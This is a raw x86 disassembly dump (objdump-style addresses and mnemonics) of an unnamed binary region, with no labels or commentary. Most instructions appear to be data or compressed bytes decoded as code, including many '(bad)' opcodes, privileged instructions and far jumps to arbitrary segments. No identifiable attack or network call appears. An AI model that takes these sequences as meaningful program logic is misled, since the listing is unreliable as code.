  41e8cf:	mov    BYTE PTR [edi+0x3f38aab3],al
  41e8d5:	fst    QWORD PTR [edi]
  41e8d7:	dec    esi
  41e8d8:	cmc    
  41e8d9:	ja     0x41e880
  41e8db:	out    0x64,al
  41e8dd:	cmp    BYTE PTR [esi+0x38c27216],ch
  41e8e3:	xchg   BYTE PTR [esp+ebp*8-0x24cb6510],dh
  41e8ea:	pop    ebx
  41e8eb:	dec    edx
  41e8ec:	loop   0x41e914
  41e8ee:	xchg   DWORD PTR [edi+eax*8],ebp
  41e8f1:	dec    esp
  41e8f2:	std    
  41e8f3:	jmp    0xae35:0xc7ea4126
  41e8fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8fb:	jno    0x41e8f5
  41e8fd:	outs   dx,DWORD PTR ds:[esi]
  41e8fe:	scas   al,BYTE PTR es:[edi]
  41e8ff:	mov    ah,0x46
  41e901:	pop    ecx
  41e902:	mov    ebx,0x83ea27b4
  41e907:	mov    ah,0xdd
  41e909:	cmp    ch,dh
  41e90b:	pop    ecx
  41e90c:	sub    edx,DWORD PTR [eax+0x3cf2c6ff]
  41e912:	xchg   ecx,eax
  41e913:	je     0x41e956
  41e915:	mov    esi,0x79f6178e
  41e91a:	add    bh,BYTE PTR [esp+ecx*1-0x2e]
  41e91e:	or     al,0xba
  41e920:	push   DWORD PTR [esi+edx*1]
  41e923:	mov    ch,0x3a
  41e925:	pusha  
  41e926:	push   0x214b0557
  41e92b:	adc    BYTE PTR [ebx],0x67
  41e92e:	mov    DWORD PTR [edx+ebp*1-0x4de3e1b4],edi
  41e935:	std    
  41e936:	jo     0x41e99b
  41e938:	sbb    edx,ecx
  41e93a:	sar    BYTE PTR [ebx],1
  41e93c:	sbb    eax,0xbbecd8e0
  41e941:	icebp  
  41e942:	cmp    DWORD PTR [edx-0x46],esp
  41e945:	jg     0x41e9c3
  41e947:	push   0x36
  41e949:	and    bh,ah
  41e94b:	cli    
  41e94c:	test   al,0x5e
  41e94e:	adc    eax,0xcf35f0ab
  41e953:	jle    0x41e915
  41e955:	jge    0x41e8e9
  41e957:	mov    bh,0x12
  41e959:	int    0xfb
  41e95b:	push   ecx
  41e95c:	addr16 (bad) 
  41e95e:	out    0x5f,al
  41e960:	sahf   
  41e961:	fs pop ecx
  41e963:	lea    edx,[esi-0x62]
  41e966:	sbb    esi,DWORD PTR [esi+0x5a]
  41e969:	ins    BYTE PTR es:[edi],dx
  41e96a:	dec    esi
  41e96b:	rdmsr  
  41e96d:	fwait
  41e96e:	cmp    DWORD PTR [edi-0x7ec26df],esi
  41e974:	mov    ah,0x2f
  41e976:	inc    eax
  41e977:	adc    edx,DWORD PTR [ecx]
  41e979:	mov    ecx,0x77a6b5fd
  41e97e:	loopne 0x41e9cf
  41e980:	and    bl,BYTE PTR [ebp+0x9]
  41e983:	iret   
  41e984:	aas    
  41e985:	adc    BYTE PTR [ecx],cl
  41e987:	outs   dx,BYTE PTR ds:[esi]
  41e988:	xlat   BYTE PTR ds:[ebx]
  41e989:	adc    eax,0x2097a1e8
  41e98e:	iret   
  41e98f:	popf   
  41e990:	in     al,0x64
  41e992:	aaa    
  41e993:	jecxz  0x41e970
  41e995:	and    al,0x65
  41e997:	and    BYTE PTR [ebx+0x14878c58],bh
  41e99d:	(bad)  
  41e99e:	(bad)  
  41e99f:	xchg   ecx,eax
  41e9a0:	push   ss
  41e9a1:	jb     0x41e968
  41e9a3:	pop    ebx
  41e9a4:	aaa    
  41e9a5:	xchg   edi,eax
  41e9a7:	les    eax,FWORD PTR [ebx]
  41e9a9:	mov    bl,0x84
  41e9ab:	repnz dec esi
  41e9ad:	addr16 mov al,ds:0x1a36
  41e9b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b2:	jecxz  0x41e9b8
  41e9b4:	add    al,0xb4
  41e9b6:	lods   al,BYTE PTR ds:[esi]
  41e9b7:	mov    ah,0x58
  41e9b9:	mov    eax,0xcd12002c
  41e9be:	fild   QWORD PTR [ebp-0x7d]
  41e9c1:	call   0xfa06:0x5ab11b03
  41e9c8:	jb     0x41e9d2
  41e9ca:	adc    eax,0xf4ca2940
  41e9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d0:	cmp    ebx,DWORD PTR [edx+esi*4]
  41e9d3:	mov    ah,0x64
  41e9d5:	add    BYTE PTR [ebp-0x7cf785e6],cl
  41e9db:	fwait
  41e9dc:	lds    edi,FWORD PTR [edi]
  41e9de:	mov    ds,WORD PTR [ebp-0x21e03554]
  41e9e4:	xor    BYTE PTR [ebx+edi*4+0x17065cae],dh
  41e9eb:	dec    esp
  41e9ec:	mov    ds:0xf5fa7c9c,al
  41e9f1:	and    eax,DWORD PTR [ecx+ecx*2-0x38]
  41e9f5:	mov    fs,WORD PTR [ebp-0x29]
  41e9f8:	shl    DWORD PTR [ebx],0x67
  41e9fb:	dec    esi
  41e9fc:	sar    DWORD PTR [edx],0x81
  41e9ff:	in     al,dx
  41ea00:	jns    0x41e9e2
  41ea02:	pop    eax
  41ea03:	pop    es
  41ea04:	jns    0x41ea76
  41ea06:	aaa    
  41ea07:	mov    bl,0xb4
  41ea09:	jb     0x41e9ca
  41ea0b:	adc    edi,eax
  41ea0d:	in     al,0x97
  41ea0f:	(bad)  
  41ea10:	pop    ebp
  41ea11:	lods   al,BYTE PTR fs:[esi]
  41ea13:	jmp    0xc3917a6c
  41ea18:	lods   eax,DWORD PTR ds:[esi]
  41ea19:	(bad)  
  41ea1b:	hlt    
  41ea1c:	cmc    
  41ea1d:	add    eax,0x8451d565
  41ea22:	and    DWORD PTR [ebp+esi*8+0x431f7801],eax
  41ea29:	push   esp
  41ea2a:	loop   0x41ea31
  41ea2c:	test   al,0xf2
  41ea2e:	fsubr  DWORD PTR [ebp+ecx*1+0x7907a79a]
  41ea35:	dec    eax
  41ea36:	dec    edx
  41ea37:	lods   eax,DWORD PTR ds:[esi]
  41ea38:	dec    ebp
  41ea39:	(bad)
  41ea3c:	mov    ch,0x3f
  41ea3e:	pusha  
  41ea3f:	aas    
  41ea40:	js     0x41ea3a
  41ea42:	daa    
  41ea43:	(bad)  
  41ea44:	adc    eax,0x60b57422
  41ea49:	out    dx,eax
  41ea4a:	ds mov ecx,0xfe622904
  41ea50:	inc    edi
  41ea51:	push   esp
  41ea52:	imul   esi,DWORD PTR [edx],0x46
  41ea55:	mov    edi,0x93437882
  41ea5a:	push   edx
  41ea5b:	ror    BYTE PTR [eax+ebx*2+0x5d],1
  41ea5f:	xchg   esp,eax
  41ea60:	(bad)  
  41ea61:	cmp    ecx,ebp
  41ea63:	sub    al,0x6c
  41ea65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea66:	cld    
  41ea67:	sbb    BYTE PTR [esi+esi*2-0x56],bl
  41ea6b:	lock iret 
  41ea6d:	cmp    dh,BYTE PTR [edi+ebp*1-0x3bda4870]
  41ea74:	dec    esp
  41ea75:	dec    ebp
  41ea76:	mov    eax,0xf0fe709e
  41ea7b:	arpl   WORD PTR [ecx-0x18d5e52c],di
  41ea81:	out    0x43,eax
  41ea83:	push   esp
  41ea84:	or     eax,0x1d28b3db
  41ea89:	xchg   edi,eax
  41ea8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea8b:	out    0xdb,al
  41ea8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea8e:	pop    eax
  41ea8f:	jecxz  0x41eb05
  41ea91:	rcl    BYTE PTR [ebx],0x28
  41ea94:	pop    eax
  41ea95:	cdq    
  41ea96:	mov    ch,0xa5
  41ea98:	enter  0x67ef,0x28
  41ea9c:	pop    esp
  41ea9d:	cmp    DWORD PTR [eax-0x2f616f56],esi
  41eaa3:	dec    edx
  41eaa4:	jb     0x41eacc
  41eaa6:	dec    eax
  41eaa7:	inc    ebp
  41eaa8:	pop    esi
  41eaa9:	mov    edx,0xff835377
  41eaae:	retf   0x3e35
  41eab1:	jmp    0x41eae8
  41eab3:	pop    ebx
  41eab4:	fwait
  41eab5:	xchg   ebx,eax
  41eab6:	mov    ch,0x57
  41eab8:	push   cs
  41eab9:	ret    0x4945
  41eabc:	xor    eax,0x6dac8234
  41eac1:	jb     0x41eb38
  41eac3:	mov    bh,0x8d
  41eac5:	dec    edi
  41eac6:	cmp    BYTE PTR [edi-0x18161406],ch
  41eacc:	ds inc edx
  41eace:	out    0x5e,eax
  41ead0:	lods   al,BYTE PTR ds:[esi]
  41ead1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ead2:	fiadd  DWORD PTR [ebx]
  41ead4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ead5:	xor    BYTE PTR [eax],dl
  41ead7:	call   0x6c33:0xff6119cc
  41eade:	sub    BYTE PTR [ebx-0x62d6af8b],ah
  41eae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eae5:	arpl   bx,sp
  41eae7:	mov    BYTE PTR [edx],bh
  41eae9:	pop    esi
  41eaea:	push   edi
  41eaeb:	stos   DWORD PTR es:[edi],eax
  41eaec:	jae    0x41eb1f
  41eaee:	push   edx
  41eaef:	mov    ecx,0x189e0a84
  41eaf4:	arpl   WORD PTR [edx+0x7],ax
  41eaf7:	(bad)  [esi]
  41eaf9:	sti    
  41eafa:	or     al,0x45
  41eafc:	cmp    al,0xa0
  41eafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaff:	push   eax
  41eb00:	sbb    esi,eax
  41eb02:	jecxz  0x41eae4
  41eb04:	loop   0x41eb23
  41eb06:	xchg   esi,eax
  41eb07:	fidivr WORD PTR [edi+0x43]
  41eb0a:	shl    BYTE PTR ds:[edx],1
  41eb0d:	dec    esp
  41eb0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb0f:	pop    esi
  41eb10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb11:	leave  
  41eb12:	adc    eax,0x36b39dd9
  41eb17:	push   ecx
  41eb18:	out    dx,al
  41eb19:	jp     0x41eb14
  41eb1b:	jne    0x41eabd
  41eb1d:	xchg   esi,eax
  41eb1e:	loopne 0x41eaee
  41eb20:	dec    ebp
  41eb21:	pop    esi
  41eb22:	or     esp,DWORD PTR [eax]
  41eb24:	mov    cl,BYTE PTR [ecx+0x20]
  41eb27:	sbb    al,0x74
  41eb29:	lods   eax,DWORD PTR ds:[esi]
  41eb2a:	push   es
  41eb2b:	inc    ecx
  41eb2c:	push   edi
  41eb2d:	inc    ecx
  41eb2e:	es and al,0xf7
  41eb31:	and    eax,0xe9d698e3
  41eb36:	retf   0xf06b
  41eb39:	sub    DWORD PTR ds:0xa1b3c1fb,edi
  41eb3f:	pop    ss
  41eb40:	fisubr DWORD PTR [edi]
  41eb42:	dec    esi
  41eb43:	dec    eax
  41eb44:	inc    ecx
  41eb45:	aas    
  41eb46:	fisttp DWORD PTR ds:0xab8acda7
  41eb4c:	xchg   BYTE PTR [esi],bl
  41eb4e:	jb     0x41eae5
  41eb50:	xlat   BYTE PTR ds:[ebx]
  41eb51:	retf   0x718e
  41eb54:	xchg   BYTE PTR [ebx+0x7e7cc98e],ah
  41eb5a:	aad    0x21
  41eb5c:	scas   eax,DWORD PTR es:[edi]
  41eb5d:	ins    BYTE PTR es:[edi],dx
  41eb5e:	sbb    esp,ebx
  41eb60:	mov    al,ds:0xaba048eb
  41eb65:	cmp    ah,al
  41eb67:	add    eax,0x9642eaba
  41eb6c:	push   0x5fdc16ed
  41eb71:	jnp    0x41ebbe
  41eb73:	sbb    al,0x77
  41eb75:	lods   eax,DWORD PTR ds:[esi]
  41eb76:	(bad)  
  41eb77:	sahf   
  41eb78:	jecxz  0x41eb70
  41eb7a:	xor    al,0x83
  41eb7c:	sbb    al,0xf
  41eb7e:	mov    bh,0x23
  41eb80:	fucomp st(2)
  41eb82:	push   esp
  41eb83:	fimul  WORD PTR [eax]
  41eb85:	call   0x95d6:0xa0954cce
  41eb8c:	sub    eax,0xe6e5ac2e
  41eb91:	mov    bl,0xca
  41eb93:	sub    eax,0xb2b2551d
  41eb98:	into   
  41eb99:	hlt    
  41eb9a:	adc    esi,DWORD PTR [esi]
  41eb9c:	cli    
  41eb9d:	dec    esp
  41eb9e:	cmp    al,0x7a
  41eba0:	sysret 
  41eba2:	mov    edx,0x5830994d
  41eba7:	mov    bh,BYTE PTR [eax]
  41eba9:	nop
  41ebaa:	dec    esi
  41ebab:	not    ch
  41ebad:	cmp    DWORD PTR [edx-0x4f],ecx
  41ebb0:	or     BYTE PTR [eax-0xd733954],0xf1
  41ebb7:	cdq    
  41ebb8:	xchg   ebx,eax
  41ebb9:	cwde   
  41ebba:	test   BYTE PTR [ecx+0x7d],bl
  41ebbd:	clc    
  41ebbe:	sbb    eax,0xffffff87
  41ebc1:	mov    gs,WORD PTR [esi+0x481947c7]
  41ebc7:	lods   eax,DWORD PTR ds:[esi]
  41ebc8:	pop    esp
  41ebc9:	inc    eax
  41ebca:	sub    BYTE PTR [edi-0x34975b29],bl
  41ebd0:	xor    eax,0x5ffe02cb
  41ebd5:	popf   
  41ebd6:	call   0x4df7:0xedb02c91
  41ebdd:	cmp    DWORD PTR [ebx-0x20],esp
  41ebe0:	aam    0x70
  41ebe2:	arpl   WORD PTR [ecx],sp
  41ebe4:	push   edi
  41ebe5:	adc    ch,dl
  41ebe7:	cmp    al,0xfa
  41ebe9:	or     al,0xfa
  41ebeb:	fdiv   DWORD PTR [ebp+0x8]
  41ebee:	fwait
  41ebef:	ins    BYTE PTR es:[edi],dx
  41ebf0:	and    al,0x27
  41ebf2:	(bad)
  41ebf5:	jg     0x41ec06
  41ebf7:	sbb    dh,bl
  41ebf9:	sub    BYTE PTR [eax-0x45],0x3c
  41ebfd:	pop    eax
  41ebfe:	stc    
  41ebff:	sbb    BYTE PTR [edx+0x6f4f13fe],ch
  41ec05:	cmp    DWORD PTR [esp+ebx*8-0x2418ea90],edi
  41ec0c:	jne    0x41ebd8
  41ec0e:	retf   0xbac9
  41ec11:	int3   
  41ec12:	test   BYTE PTR [ebx-0x2c],dh
  41ec15:	inc    edx
  41ec16:	inc    edi
  41ec17:	icebp  
  41ec18:	push   ecx
  41ec19:	cmp    BYTE PTR [edx-0x51878990],ch
  41ec1f:	xor    BYTE PTR [eax],cl
  41ec21:	dec    ebp
  41ec22:	int    0x42
  41ec24:	fcmove st,st(3)
  41ec26:	out    dx,al
  41ec27:	jb     0x41ebbd
  41ec29:	mov    ch,0x54
  41ec2b:	xchg   edx,eax
  41ec2c:	jmp    0xedaf85b0
  41ec31:	imul   ecx,DWORD PTR [ebx-0x8ceae59],0x22
  41ec38:	hlt    
  41ec39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec3a:	xchg   ebp,eax
  41ec3b:	and    esi,DWORD PTR [ebx-0x3e]
  41ec3e:	adc    al,0xbd
  41ec40:	jl     0x41ebc6
  41ec42:	cli    
  41ec43:	mov    dl,0x1b
  41ec45:	push   es
  41ec46:	retf   0x9058
  41ec49:	loopne 0x41ebef
  41ec4b:	inc    edi
  41ec4c:	shr    BYTE PTR [eax-0x27],cl
  41ec4f:	xor    al,BYTE PTR [esi]
  41ec51:	mov    ds:0xbd510f52,al
  41ec56:	mov    bl,0x58
  41ec58:	shl    BYTE PTR [esi],0x76
  41ec5b:	in     al,dx
  41ec5c:	or     al,0xd8
  41ec5e:	test   eax,0x12c03f6d
  41ec63:	inc    ecx
  41ec64:	pop    edx
  41ec65:	xor    al,0x5c
  41ec67:	mov    ebx,0xc1a25a04
  41ec6c:	jl     0x41ecb4
  41ec6e:	and    BYTE PTR [eax-0x19],dh
  41ec71:	in     eax,0x5a
  41ec73:	xchg   esp,eax
  41ec74:	mov    edx,0x827474d2
  41ec79:	retf   
  41ec7a:	mov    ch,0xc0
  41ec7c:	mov    ds:0xaeeebcc5,eax
  41ec81:	sbb    BYTE PTR [ecx],0x54
  41ec84:	in     eax,0xb9
  41ec86:	lds    edi,FWORD PTR [esi+0x30]
  41ec89:	jg     0x41ec38
  41ec8b:	gs jl  0x41ec63
  41ec8e:	outs   dx,BYTE PTR ds:[esi]
  41ec8f:	mov    esi,DWORD PTR [esi+ebp*2]
  41ec92:	push   edx
  41ec93:	adc    bl,bh
  41ec95:	lea    eax,[esi+0x0]
	...
  41ed13:	add    BYTE PTR ds:0x773f6240,dl
  41ed19:	aas    
  41ed1a:	pop    ebp
  41ed1b:	push   0xffffff86
  41ed1d:	jb     0x41ed81
  41ed1f:	stc    
  41ed20:	lahf   
  41ed21:	pop    ebx
  41ed22:	js     0x41ed7e
  41ed24:	jbe    0x41ecad
  41ed26:	add    DWORD PTR [eax],eax
  41ed28:	imul   eax,DWORD PTR [edi],0x0
  41ed2b:	add    BYTE PTR [ebx+0x535544ab],ch
  41ed31:	sti    
  41ed32:	jge    0x41ecdd
  41ed34:	in     eax,0x87
  41ed36:	test   DWORD PTR [ebx],esp
  41ed38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed39:	imul   ebx,DWORD PTR [edi],0xe38cf732
  41ed3f:	adc    BYTE PTR [edx-0x5cc52b35],ch
  41ed45:	dec    esi
  41ed46:	pop    es
  41ed47:	cld    
  41ed48:	mov    bh,0x10
  41ed4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed4b:	ins    DWORD PTR es:[edi],dx
  41ed4c:	sub    BYTE PTR [ecx-0x18db8cfc],ch
  41ed52:	int    0x32
  41ed54:	inc    ebx
  41ed55:	inc    edi
  41ed56:	in     eax,0xda
  41ed58:	es fs mov edx,0x1e0280ec
  41ed5f:	pop    esp
  41ed60:	jmp    0x41ed2a
  41ed62:	inc    eax
  41ed63:	push   0xffffffa7
  41ed65:	sbb    dh,dl
  41ed67:	mov    cl,0x57
  41ed69:	lods   eax,DWORD PTR ds:[esi]
  41ed6a:	into   
  41ed6b:	outs   dx,BYTE PTR ds:[esi]
  41ed6c:	sub    DWORD PTR ds:0x5ce99f26,esp
  41ed72:	shl    ah,cl
  41ed74:	xlat   BYTE PTR ds:[ebx]
  41ed75:	xor    edx,DWORD PTR [ebx-0x63]
  41ed78:	adc    esi,DWORD PTR [ebx+esi*2-0x73]
  41ed7c:	cmp    bl,ah
  41ed7e:	and    al,0x33
  41ed80:	mov    esp,0x319318c4
  41ed85:	or     bh,BYTE PTR [ecx]
  41ed87:	fist   WORD PTR [edi-0x7a172eb3]
  41ed8d:	xchg   ebx,eax
  41ed8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed8f:	loop   0x41ed17
  41ed91:	ins    BYTE PTR es:[edi],dx
  41ed92:	and    al,0x42
  41ed94:	mov    ah,0xf4
  41ed96:	cmp    ecx,ecx
  41ed98:	push   edx
  41ed99:	jl     0x41eda9
  41ed9b:	mov    dl,0xd8
  41ed9d:	gs data16 aad 0xeb
  41eda1:	jmp    0xccda:0xea81e4c1
  41eda8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eda9:	cmp    eax,0xc2d0ca3e
  41edae:	fcom   DWORD PTR [esi-0x21]
  41edb1:	data16 scas al,BYTE PTR es:[edi]
  41edb3:	fstp   QWORD PTR [edx]
  41edb5:	jae    0x41ed49
  41edb7:	dec    eax
  41edb8:	test   ch,bh
  41edba:	sub    BYTE PTR gs:[eax],dl
  41edbd:	adc    eax,0x7456b2ba
  41edc2:	jbe    0x41edbb
  41edc4:	mov    al,ds:0x52c46238
  41edc9:	jmp    0x85d5d80c
  41edce:	arpl   ax,dx
  41edd0:	sahf   
  41edd1:	sar    BYTE PTR [eax+0xc],cl
  41edd4:	cld    
  41edd5:	in     al,0x3c
  41edd7:	lods   al,BYTE PTR ds:[esi]
  41edd8:	sub    eax,0x1989e45f
  41eddd:	leave  
  41edde:	bound  edi,QWORD PTR [ebx-0x4e]
  41ede1:	mov    al,ds:0xd8b5a708
  41ede6:	or     cl,bh
  41ede8:	pop    ecx
  41ede9:	shr    DWORD PTR [ecx+ecx*1+0x36],cl
  41eded:	test   cl,bl
  41edef:	(bad)  
  41edf1:	inc    ebp
  41edf2:	add    eax,0x29f4d96e
  41edf7:	data16 shl BYTE PTR [edx-0x55942f2],1
  41edfe:	pop    ecx
  41edff:	add    esp,DWORD PTR [ebx+0x77449a3]
  41ee05:	shl    cl,0x8a
  41ee08:	(bad)  
  41ee0a:	int3   
  41ee0b:	sbb    ch,BYTE PTR [edx+0x4c2c9272]
  41ee11:	ins    BYTE PTR es:[edi],dx
  41ee12:	test   DWORD PTR [eax+0x1b318591],ebx
  41ee18:	jge    0x41ee7c
  41ee1a:	and    BYTE PTR [esi+0x6d],0xd5
  41ee1e:	jns    0x41ee87
  41ee20:	xor    eax,0xdca8f4f2
  41ee25:	xchg   edi,eax
  41ee26:	test   BYTE PTR [esi-0x77decac9],dl
  41ee2c:	out    0xb2,al
  41ee2e:	cmp    edi,edi
  41ee30:	dec    edi
  41ee31:	enter  0x9b92,0xd3
  41ee35:	mov    ah,0xb2
  41ee37:	es push edx
  41ee39:	add    eax,0x9f873007
  41ee3e:	je     0x41ee87
  41ee40:	test   DWORD PTR [eax+0x64ad0c5f],ebp
  41ee46:	jns    0x41ee5a
  41ee48:	sub    ebx,eax
  41ee4a:	cdq    
  41ee4b:	sub    BYTE PTR [ecx+0x16],al
  41ee4e:	jle    0x41ee7c
  41ee50:	stc    
  41ee51:	in     al,dx
  41ee52:	or     BYTE PTR [eax+ecx*8+0x380af207],bl
  41ee59:	or     DWORD PTR [edx],eax
  41ee5b:	outs   dx,DWORD PTR ds:[esi]
  41ee5c:	sbb    eax,0x1212927d
  41ee61:	xor    eax,esi
  41ee63:	punpcklwd mm0,DWORD PTR [esi]
  41ee66:	adc    al,0xb4
  41ee68:	mov    esp,0x2234033a
  41ee6d:	iret   
  41ee6e:	xchg   DWORD PTR [eax],ebp
  41ee70:	adc    eax,0xd536da91
  41ee75:	adc    BYTE PTR [esp+esi*2],bl
  41ee78:	xchg   BYTE PTR [ebx+0xf],ah
  41ee7b:	inc    esp
  41ee7c:	jmp    0x1b7599bf
  41ee81:	shl    BYTE PTR [ebp-0x2a1e9d83],cl
  41ee87:	lahf   
  41ee88:	and    edi,0xffffffbd
  41ee8b:	push   ds
  41ee8c:	push   es
  41ee8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee8e:	ror    eax,1
  41ee90:	push   esi
  41ee91:	jb     0x41ee37
  41ee93:	mov    ds:0xd5fb6034,eax
  41ee98:	sub    bh,bh
  41ee9a:	sbb    eax,0xe88b1d26
  41ee9f:	adc    eax,0x4be857a0
  41eea4:	mov    eax,ds:0xa6963f04
  41eea9:	xor    eax,DWORD PTR [ebx+eax*4+0x7b]
  41eead:	in     al,dx
  41eeae:	sub    ebx,DWORD PTR [ecx-0x59]
  41eeb1:	ss mov ebx,0xf99b368d
  41eeb7:	jl     0x41eea9
  41eeb9:	and    dh,dl
  41eebb:	sbb    al,0x9
  41eebd:	add    DWORD PTR [esi+0x756c71ca],0xb197e73b
  41eec7:	cmp    eax,0xfe729db9
  41eecc:	pop    edi
  41eecd:	inc    eax
  41eece:	ret    0x90c0
  41eed1:	jnp    0x41ee75
  41eed3:	ins    BYTE PTR es:[edi],dx
  41eed4:	ins    BYTE PTR es:[edi],dx
  41eed5:	mov    edx,DWORD PTR [ebx+0x5b]
  41eed8:	cwde   
  41eed9:	xlat   BYTE PTR ds:[ebx]
  41eeda:	in     eax,dx
  41eedb:	clc    
  41eedc:	mov    esi,0xdb236e59
  41eee1:	popf   
  41eee2:	stos   DWORD PTR es:[edi],eax
  41eee3:	fbstp  TBYTE PTR [ecx-0x5c]
  41eee6:	cmp    eax,0x38b5344a
  41eeeb:	loopne 0x41ef53
  41eeed:	aad    0x58
  41eeef:	mov    al,0x76
  41eef1:	imul   esi,esp,0xffffff87
  41eef4:	sbb    DWORD PTR [ebx+ebx*4-0x62e72b33],ebp
  41eefb:	mov    ?,WORD PTR [ebx+0x37]
  41eefe:	pop    esp
  41eeff:	add    DWORD PTR [edx-0x774caa3c],0x55
  41ef06:	cmp    esi,DWORD PTR [ecx-0x77a21bdc]
  41ef0c:	xor    eax,esi
  41ef0e:	es ja  0x41ef22
  41ef11:	gs addr16 xor al,0x2d
  41ef15:	mov    ds:0xd8a3b14,al
  41ef1a:	mov    dh,cl
  41ef1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef1d:	jle    0x41eed7
  41ef1f:	inc    esi
  41ef20:	cdq    
  41ef21:	in     al,0x98
  41ef23:	dec    esi
  41ef24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef25:	push   es
  41ef26:	dec    edi
  41ef27:	test   ebx,esi
  41ef29:	jmp    0x29236a99
  41ef2e:	sub    bl,ah
  41ef30:	jle    0x41ef85
  41ef32:	xor    eax,0x49eb8dcb
  41ef37:	jmp    0xe5fc:0x78ec6a59
  41ef3e:	sbb    BYTE PTR [ebp+0x3c66cb65],ah
  41ef44:	sub    esp,DWORD PTR [ebx]
  41ef46:	daa    
  41ef47:	bound  eax,QWORD PTR [ebx+0x6d4c8a5]
  41ef4d:	outs   dx,DWORD PTR ds:[esi]
  41ef4e:	dec    edx
  41ef4f:	adc    eax,0xbe6d503d
  41ef54:	mov    edi,0x917df316
  41ef59:	loopne 0x41eee5
  41ef5b:	test   BYTE PTR [edi+0x45],0xdf
  41ef5f:	jbe    0x41ef82
  41ef61:	clc    
  41ef62:	jecxz  0x41efa5
  41ef64:	imul   ebp,DWORD PTR [esi+0x47],0xffffffe7
  41ef68:	mov    edx,0x1f6c76cf
  41ef6d:	fprem  
  41ef6f:	xchg   esp,eax
  41ef70:	int    0xc4
  41ef72:	sub    bh,BYTE PTR [ebp-0x6b583b0a]
  41ef78:	stos   BYTE PTR es:[edi],al
  41ef79:	sbb    BYTE PTR [eax+0x5e],0x1f
  41ef7d:	mov    eax,ds:0x75b5ae56
  41ef82:	push   ebp
  41ef83:	scas   al,BYTE PTR es:[edi]
  41ef84:	bound  edx,QWORD PTR [edx+eax*4-0xabcdaf9]
  41ef8b:	sub    ah,BYTE PTR [ebp+0xd]
  41ef8e:	mov    ebx,0xd30c92fd
  41ef93:	dec    edx
  41ef94:	add    eax,0xcf28bafb
  41ef99:	stos   BYTE PTR es:[edi],al
  41ef9a:	fld    DWORD PTR [ebx*8+0x4a53e3fa]
  41efa1:	leave  
  41efa2:	and    al,0x56
  41efa4:	loop   0x41efe3
  41efa6:	nop
  41efa7:	fst    QWORD PTR [eax+0x688e0d54]
  41efad:	push   ds
  41efae:	lahf   
  41efaf:	das    
  41efb0:	adc    ecx,esi
  41efb2:	sbb    ch,BYTE PTR [edx+0x5aac4656]
  41efb8:	icebp  
  41efb9:	lea    edx,[ebx-0x3341a093]
  41efbf:	push   ss
  41efc0:	jbe    0x41f015
  41efc2:	pop    edx
  41efc3:	(bad)  
  41efc4:	pop    ebp
  41efc5:	sahf   
  41efc6:	pop    ss
  41efc7:	imul   esp,DWORD PTR [edi+0x327d10c9],0x3
  41efce:	cli    
  41efcf:	add    eax,0xc1aa6084
  41efd4:	sbb    dl,BYTE PTR [ecx+0x1c302341]
  41efda:	test   eax,0xbf221131
  41efdf:	jl     0x41f02b
  41efe1:	pop    esi
  41efe2:	push   esi
  41efe3:	dec    ebp
  41efe4:	fld    TBYTE PTR [edi-0x10]
  41efe7:	loopne 0x41f050
  41efe9:	mov    al,0x4d
  41efeb:	fdivr  QWORD PTR [esi-0x6b]
  41efee:	lods   al,BYTE PTR ds:[esi]
  41efef:	jl     0x41f029
  41eff1:	jbe    0x41efa3
  41eff3:	xlat   BYTE PTR ds:[ebx]
  41eff4:	ror    esi,cl
  41eff6:	ret    
  41eff7:	dec    esi
  41eff8:	jo     0x41ef9e
  41effa:	(bad)  
  41effb:	mov    esp,0xc0460cd2
  41f000:	outs   dx,DWORD PTR ds:[esi]
  41f001:	push   0x568d3fed
  41f006:	leave  
  41f007:	cwde   
  41f008:	test   DWORD PTR [ebx],edx
  41f00a:	mov    esi,esp
  41f00c:	(bad)  
  41f00d:	fidiv  WORD PTR [edi+ecx*4+0x20]
  41f011:	outs   dx,BYTE PTR ds:[esi]
  41f012:	paddq  mm1,QWORD PTR [esp+edi*4]
  41f016:	lahf   
  41f017:	or     dl,ah
  41f019:	in     eax,0x76
  41f01b:	dec    esp
  41f01c:	xchg   esp,ebx
  41f01e:	aaa    
  41f01f:	nop
  41f020:	gs cmp eax,0x13c1e08
  41f026:	sbb    BYTE PTR [ebp-0x2],dl
  41f029:	(bad)  
  41f02a:	outs   dx,DWORD PTR ds:[esi]
  41f02b:	div    BYTE PTR [ebx+0x8]
  41f02e:	es (bad) 
  41f030:	and    BYTE PTR ds:0xfcee870d,bh
  41f036:	or     BYTE PTR ds:[edi+0x5b],dh
  41f03a:	je     0x41f00a
  41f03c:	pop    es
  41f03d:	stc    
  41f03e:	call   0x9e7a982e
  41f043:	shl    ebp,0xbb
  41f046:	mov    al,ds:0x8758291c
  41f04b:	mov    edi,0x9b40bef5
  41f050:	into   
  41f051:	adc    ebp,ebp
  41f053:	rcr    DWORD PTR [eax],cl
  41f055:	test   eax,ebp
  41f057:	sahf   
  41f058:	mov    ebp,0x8d72d999
  41f05d:	retf   0x2e0d
  41f060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f061:	mov    ch,0xfb
  41f063:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f065:	cmc    
  41f066:	icebp  
  41f067:	sbb    al,0x4f
  41f069:	inc    ecx
  41f06a:	jns    0x41f082
